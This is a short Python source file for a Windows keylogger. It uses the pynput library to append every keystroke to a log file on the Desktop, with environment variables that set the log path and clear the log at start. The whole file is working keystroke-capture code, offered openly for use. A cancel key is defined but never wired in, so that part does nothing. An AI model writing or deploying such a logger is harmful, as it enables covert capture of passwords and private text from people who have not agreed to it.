# Python code for keylogger
# to be used in windows
import os
from pynput import keyboard
  
# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Desktop/file.log')
)
# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)
  
# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
       # File does not exist, or no permissions.
        pass
  
#creating key pressing event and saving it into log file
def on_press(key):
    with open(log_file, 'a') as f:
        try:
            f.write('{}\n'.format(key.char))
        except AttributeError:
            f.write('{}\n'.format(key))
  
# create a listener object
listener = keyboard.Listener(on_press=on_press)
# start the listener
listener.start()
listener.join()

